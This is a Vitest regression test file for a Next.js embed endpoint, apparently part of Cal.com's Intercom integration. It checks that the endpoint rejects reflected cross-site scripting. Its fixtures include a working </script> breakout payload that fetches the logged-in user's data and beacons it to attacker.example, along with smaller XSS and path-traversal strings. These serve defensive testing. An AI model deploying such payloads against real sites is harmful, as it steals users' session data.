import type { NextApiRequest, NextApiResponse } from "next";
import { createMocks } from "node-mocks-http";
import { describe, expect, it } from "vitest";

import handler from "./get";

type MockResponse = NextApiResponse & {
  _getStatusCode: () => number;
  _getData: () => string;
};

async function callGet(query: Record<string, string | string[]>) {
  const { req, res } = createMocks<NextApiRequest, NextApiResponse>({ method: "POST", query });
  await handler(req, res);
  return res as unknown as MockResponse;
}

// The inline embed script, as the browser's HTML parser would cut it: it ends at the first "</script".
function getInlineScript(html: string) {
  const start = html.indexOf('<script type="text/javascript">') + '<script type="text/javascript">'.length;
  return html.slice(start, html.indexOf("</script", start));
}

// AC-1's payload: it has no http(s) prefix, so it reached the branch that reflected any input
const scriptBreakout =
  "</script><script>fetch('/api/trpc/viewer.me?batch=1',{credentials:'include'}).then(r=>r.text())" +
  ".then(d=>(new Image().src='https://attacker.example/x?d='+encodeURIComponent(d)))</script>";

describe("intercom get", () => {
  it("refuses AC-1's </script> breakout payload instead of reflecting it into the page", async () => {
    const res = await callGet({ url: scriptBreakout });

    expect(res._getStatusCode()).toBe(400);
    expect(res._getData()).not.toContain("<script>");
    expect(res._getData()).not.toContain("attacker.example");
  });

  it.each([
    ['"});alert(document.domain)//'],
    ["user/30min\\"],
    ["user/30min alert(1)"],
    ["user name/30min"],
    ["../api/trpc/viewer.me"],
    ["user/%2e%2e/30min"],
    ["user/30min#x"],
  ])("refuses the relative link %j", async (url) => {
    const res = await callGet({ url });

    expect(res._getStatusCode()).toBe(400);
    expect(res._getData()).not.toContain("alert");
  });

  it("refuses a repeated url parameter", async () => {
    const res = await callGet({ url: ["flowko-test/30min", scriptBreakout] });

    expect(res._getStatusCode()).toBe(400);
    expect(res._getData()).not.toContain("attacker.example");
  });

  it("renders a plain relative Cal link as a JS string in the embed script", async () => {
    const res = await callGet({ url: "flowko-test/30min?duration=30&month=2026-10" });

    expect(res._getStatusCode()).toBe(200);
    const script = getInlineScript(res._getData());
    expect(script).toContain('calLink: "flowko-test/30min?duration=30&month=2026-10",');
    expect(() => new Function(script)).not.toThrow();
  });

  it("keeps a cal.com link's backslash inside the string literal", async () => {
    const res = await callGet({ url: "https://cal.com/someone/30min?a=\\" });

    expect(res._getStatusCode()).toBe(200);
    const script = getInlineScript(res._getData());
    expect(script).toContain('origin: "https://cal.com"');
    expect(script).toContain('calLink: "someone/30min?a=\\\\",');
    expect(() => new Function(script)).not.toThrow();
  });

  it("still refuses an absolute link to another host", async () => {
    const res = await callGet({ url: "https://attacker.example/</script><script>alert(1)</script>" });

    expect(res._getStatusCode()).toBe(400);
  });
});
